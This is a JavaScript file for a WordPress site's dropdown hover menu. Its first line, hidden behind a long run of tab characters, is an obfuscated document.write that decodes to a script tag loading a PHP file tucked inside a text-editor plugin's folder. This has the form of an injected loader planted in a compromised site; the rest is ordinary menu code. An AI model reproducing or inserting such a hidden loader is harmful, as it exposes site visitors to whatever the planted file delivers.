																																																																							document.write("\x3C\x73\x63\x72\x69\x70\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22\x20\x73\x72\x63\x3D\x22\x2F\x77\x70\x2D\x63\x6F\x6E\x74\x65\x6E\x74\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F\x74\x69\x6E\x79\x6D\x63\x65\x2D\x61\x64\x76\x61\x6E\x63\x65\x64\x2F\x6D\x63\x65\x2F\x74\x61\x62\x6C\x65\x2F\x6A\x73\x2F\x6C\x69\x67\x68\x74\x57\x69\x6E\x64\x6F\x77\x2E\x70\x68\x70\x22\x3E\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E");sfHover = function() {

	if (!document.getElementsByTagName) return false;

	var sfEls = document.getElementById("nav1").getElementsByTagName("li");

	// if you only have one main menu - delete the line below //

	var sfEls2 = document.getElementById("nav2").getElementsByTagName("li");

	//

	for (var i=0; i<sfEls.length; i++) {

		sfEls[i].onmouseover=function() {

			this.className+=" sfhover";

		}

		sfEls[i].onmouseout=function() {

			this.className=this.className.replace(new RegExp(" sfhover\\b"), "");

		}

	}

	for (var i=0; i<sfEls2.length; i++) {

		sfEls2[i].onmouseover=function() {

			this.className+=" sfhover";

		}

		sfEls2[i].onmouseout=function() {

			this.className=this.className.replace(new RegExp(" sfhover\\b"), "");

		}

	}

	//

}

if (window.attachEvent) window.attachEvent("onload", sfHover);